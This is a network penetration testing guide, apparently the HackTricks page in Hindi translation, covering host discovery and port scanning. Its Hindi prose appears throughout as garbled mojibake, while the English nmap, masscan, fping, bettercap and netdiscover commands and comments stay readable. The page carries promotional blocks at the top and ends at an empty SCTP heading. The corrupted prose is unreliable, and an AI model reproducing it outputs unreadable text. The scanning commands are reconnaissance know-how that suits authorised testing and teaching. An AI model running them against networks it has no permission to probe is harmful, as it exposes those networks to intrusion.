# рдиреЗрдЯрд╡рд░реНрдХ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдЕрдк рдЯреВ **$100,000** рддрдХ рдХрдорд╛рдирд╛!

{% embed url="https://go.intigriti.com/hacktricks" %}

## рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ

рдпрд╣ рдПрдХ **рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдЦрдВрдб** рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ **рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдХрд┐рд╕реА рд╣реЛрд╕реНрдЯ рдХреЛ рдХреИрд╕реЗ рдЦреЛрдЬреЗрдВ**ред\
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреБрдЫ **рдЖрдИрдкреА рд╕реНрдХреЛрдк** рд╣реЛрддрд╛ рд╣реИ (рд╢рд╛рдпрдж рдХрдИ **рд░реЗрдВрдЬ** рднреА) рдФрд░ рдЖрдкрдХреЛ **рдХреМрди рд╕реЗ рдЖрдИрдкреА рд╕рдВрд╡рд╛рдж рдХрд░ рд░рд╣реЗ рд╣реИрдВ** рдпрд╣ рдкрддрд╛ рдХрд░рдирд╛ рд╣реИред

### ICMP

рдпрд╣ рд╣реЛрд╕реНрдЯ рдЙрдк рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдпрд╣ рдЬрд╛рдирдиреЗ рдХрд╛ **рд╕рдмрд╕реЗ рдЖрд╕рд╛рди** рдФрд░ **рддреЗрдЬрд╝ рддрд░реАрдХрд╛** рд╣реИред\
рдЖрдк рдХреБрдЫ **ICMP** рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдПрдХ **рдЗрдХреЛ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдирд╛ рд╣реИ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЙрдореНрдореАрдж рдХрд░рдирд╛ рд╣реИред рдЖрдк рдЗрд╕реЗ рдПрдХ рд╕рд╛рдзрд╛рд░рдг `ping` рдпрд╛ **рд░реЗрдВрдЬ** рдХреЗ рд▓рд┐рдП `fping` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк **nmap** рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП (рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп ICMP рдЗрдХреЛ рдЕрдиреБрд░реЛрдз-рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░реЗрдЧрд╛)ред
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЗрд╡рд▓ **рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕ рдвреВрдВрдврдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛** рд╣реИред рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдореЗрдВ **65535 рдкреЛрд░реНрдЯреНрд╕** рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ "рдмрдбрд╝реА" рд╕реНрдХреЛрдк рд╣реИ рддреЛ рдЖрдк **рд╣рд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╣рд░ рдкреЛрд░реНрдЯ** рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рдирд╣реАрдВ рд▓реЗ рд╕рдХрддреЗ, рдпрд╣ рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╕рдордп рд▓реЗрдЧрд╛ред\
рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ **рддреЗрдЬ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд░** ([masscan](https://github.com/robertdavidgraham/masscan)) рдФрд░ **рдЕрдзрд┐рдХ рдкреНрд░рдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯреНрд╕** рдХреА рд╕реВрдЪреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдпрд╣ рдПрдХ TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ рд╣реИ рдЬреЛ рдЬрдм рдЖрдк **HTTP рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**ред
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдЖрдк рдпрд╣ рднреА рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ **UDP рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛** рд╣реИ рддрд╛рдХрд┐ рдЖрдкрдХреЛ рдПрдХ **рд╣реЛрд╕реНрдЯ** рдкрд░ **рдЕрдзрд┐рдХ рдзреНрдпрд╛рди рджреЗрдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред UDP рд╕реЗрд╡рд╛рдПрдВ рдЖрдо рддреМрд░ рдкрд░ **рдХрд┐рд╕реА рдбреЗрдЯрд╛** рдХреЗ рд╕рд╛рде **рдХрд┐рд╕реА рдирд┐рдпрдорд┐рдд рдЦрд╛рд▓реА UDP рдкреНрд░реЛрдм рдкреИрдХреЗрдЯ** рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ рджреЗрддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХрдард┐рди рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдкреЛрд░реНрдЯ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИред рдЗрд╕реЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд░рд▓ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЪрд▓ рд░рд╣реА рд╕реЗрд╡рд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬреЗрдВ, рдФрд░ рдЬреИрд╕рд╛ рдХрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдХреМрди рд╕реА рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реИ, рдЖрдкрдХреЛ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рдмрд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
рдиреАрдЪреЗ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд nmap рд▓рд╛рдЗрди рд╣рд░ рд╣реЛрд╕реНрдЯ рдореЗрдВ **/24** рд░реЗрдВрдЬ рдХреЗ **рд╢реАрд░реНрд╖ 1000 UDP рдкреЛрд░реНрдЯ** рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдЧреА, рд▓реЗрдХрд┐рди рдпрд╣ рднреА рдХреЗрд╡рд▓ рдЗрд╕рдХреЗ рд▓рд┐рдП **>20 рдорд┐рдирдЯ** рд▓реЗрдЧрд╛ред рдпрджрд┐ **рддреЗрдЬрд╝ рдирддреАрдЬреЗ** рдЪрд╛рд╣рд┐рдП рддреЛ рдЖрдк [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `./udp-proto-scanner.pl 199.66.11.53/24` рдпрд╣ рдЗрди **UDP рдкреНрд░реЛрдмреНрд╕** рдХреЛ рдЙрдирдХреЗ **рдЕрдкреЗрдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯ** рдкрд░ рднреЗрдЬреЗрдЧрд╛ (рдПрдХ /24 рд░реЗрдВрдЬ рдХреЗ рд▓рд┐рдП рдпрд╣ рд╕рд┐рд░реНрдл 1 рдорд┐рдирдЯ рд▓реЗрдЧрд╛): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## WiFi рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

рдпрд╣рд╛рдБ рдЖрдкрдХреЛ рд▓реЗрдЦрди рдХреЗ рд╕рдордп рд╕рднреА рдкреНрд░рд╕рд┐рджреНрдз WiFi рд╣рдорд▓реЛрдВ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдорд┐рд▓реЗрдЧрд╛:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## рдЕрдВрджрд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ

рдЕрдЧрд░ рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ **рдЕрдиреНрдп рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ** рдХрд░рдиреА рд╣реЛрдЧреАред рдЖрдкрдХреА рдХреНрдпрд╛ рдзреНрд╡рдирд┐ рд╣реИ, рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдХреМрди рд╕реЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ:

### рдирд┐рд╖реНрдХреНрд░рд┐рдп

рдЖрдк рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬреБрдбрд╝реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### рд╕рдХреНрд░рд┐рдп

рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рддрдХрдиреАрдХреЗрдВ рдЬреЛ [_**рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ_) рдореЗрдВ рдЯрд┐рдкреНрдкрдгреА рдХреА рдЧрдИ рд╣реИрдВ, рд╡реЗ рдпрд╣рд╛рдБ рднреА **рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рд▓реЗрдХрд┐рди, рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЗ рд╕рд╛рде **рдПрдХ рд╣реА рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рдЖрдк **рдЕрдзрд┐рдХ рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### рд╕рдХреНрд░рд┐рдп ICMP

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ _рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯ рдХреА рдЦреЛрдЬ_ рдореЗрдВ рдЯрд┐рдкреНрдкрдгреАрдд рддрдХрдиреАрдХреЗрдВ ([_**ICMP**_](./#icmp)) рдпрд╣рд╛рдБ рднреА **рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рд▓реЗрдХрд┐рди, рдЖрдк **рджреВрд╕рд░реЗ рд╣реЛрд╕реНрдЯреНрд╕** рдХреЗ рд╕рд╛рде **рдПрдХ рд╣реА рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рддреЛ рдЖрдк **рдЕрдзрд┐рдХ рдЪреАрдЬреЗрдВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рдпрджрд┐ рдЖрдк **рд╕рдмрдиреЗрдЯ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ** рдкрд░ **рдкрд┐рдВрдЧ** рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдкрд┐рдВрдЧ **рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╡реЗ **рдЖрдкрдХреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рджреЗ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 10.10.5.255`
* рдиреЗрдЯрд╡рд░реНрдХ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ рдкрд░ рдкрд┐рдВрдЧ рдХрд░рдХреЗ рдЖрдк **рдЕрдиреНрдп рд╕рдмрдиреЗрдЯреНрд╕** рдореЗрдВ рд╣реЛрд╕реНрдЯреНрд╕ рднреА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 255.255.255.255`
* `nmap` рдХреЗ `-PE`, `-PP`, `-PM` рдлреНрд▓реИрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯ рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **ICMPv4 рдЗрдХреЛ**, **рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк**, рдФрд░ **рд╕рдмрдиреЗрдЯ рдорд╛рд╕реНрдХ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **рд╡реЗрдХ рдСрди рд▓реИрди**

рд╡реЗрдХ рдСрди рд▓реИрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдВрдкреНрдпреВрдЯрд░реНрд╕ рдХреЛ **рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрджреЗрд╢** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдЪрд╛рд▓реВ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рдЪрд╛рд▓реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЬрд╛рджреВ рд╕рдВрджреЗрд╢ рдХреЗрд╡рд▓ рдПрдХ рдкреИрдХреЗрдЯ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ **MAC Dst** рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдпрд╣ **16 рдмрд╛рд░** рдПрдХ рд╣реА рдкреИрдХреЗрдЯ рдХреЗ рдЕрдВрджрд░ рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдлрд┐рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рдЖрдо рддреМрд░ рдкрд░ рдПрдХ **рдЗрдерд░рдиреЗрдЯ 0x0842** рдореЗрдВ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдпрд╛ рдПрдХ **UDP рдкреИрдХреЗрдЯ рдкреЛрд░реНрдЯ 9** рдореЗрдВред\
рдпрджрд┐ **рдХреЛрдИ \[MAC]** рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдкреИрдХреЗрдЯ **рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдЗрдерд░рдиреЗрдЯ** рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдФрд░ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ MAC рд╡рд╣ рд╣реЛрдЧрд╛ рдЬреЛ рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ)ред
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## рд╣реЛрд╕реНрдЯ рд╕реНрдХреИрди рдХрд░рдирд╛

рдЬрдм рдЖрдкрдиреЗ рд╕рднреА рдЖрдИрдкреА (рдмрд╛рд╣рд░реА рдпрд╛ рдЖрдВрддрд░рд┐рдХ) рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

### TCP

* **рдЦреБрд▓рд╛** рдкреЛрд░реНрдЯ: _SYN --> SYN/ACK --> RST_
* **рдмрдВрдж** рдкреЛрд░реНрдЯ: _SYN --> RST/ACK_
* **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ: _SYN --> \[рдХреЛрдИ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ]_
* **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЛрд░реНрдЯ: _SYN --> ICMP рд╕рдВрджреЗрд╢_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 2 рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* **UDP рдкреИрдХреЗрдЯ** рднреЗрдЬреЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдкреЛрд░реНрдЯ **рдмрдВрдж** рд╣реИ рдЕрдЧрд░ **рдЬрд╡рд╛рдм** рдореЗрдВ _**ICMP unreachable**_ рдорд┐рд▓рддрд╛ рд╣реИ (рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ ICMP **рдлрд╝рд┐рд▓реНрдЯрд░** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдХреЛрдИ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрдЧреА рдХрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИ)ред
* **рдлреЙрд░реНрдореЗрдЯреЗрдб рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо** рднреЗрдЬреЗрдВ рддрд╛рдХрд┐ рдПрдХ **рд╕реЗрд╡рд╛** рд╕реЗ рдЬрд╡рд╛рдм рдорд┐рд▓реЗ (рдЬреИрд╕реЗ, DNS, DHCP, TFTP, рдФрд░ рдЕрдиреНрдп, рдЬреИрд╕реЗ рдХрд┐ _nmap-payloads_ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рд╣реИ)ред рдЕрдЧрд░ рдЖрдкрдХреЛ **рдЬрд╡рд╛рдм** рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдкреЛрд░реНрдЯ **рдЦреБрд▓рд╛** рд╣реИред

**Nmap** "-sV" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рджреЛрдиреЛрдВ** рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг рдХрд░реЗрдЧрд╛ (UDP рд╕реНрдХреИрди рдмрд╣реБрдд рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ), рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ UDP рд╕реНрдХреИрди TCP рд╕реНрдХреИрди рд╕реЗ рдзреАрдорд╛ рд╣реЛрддрд╛ рд╣реИ:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP рд╕реНрдХреИрди

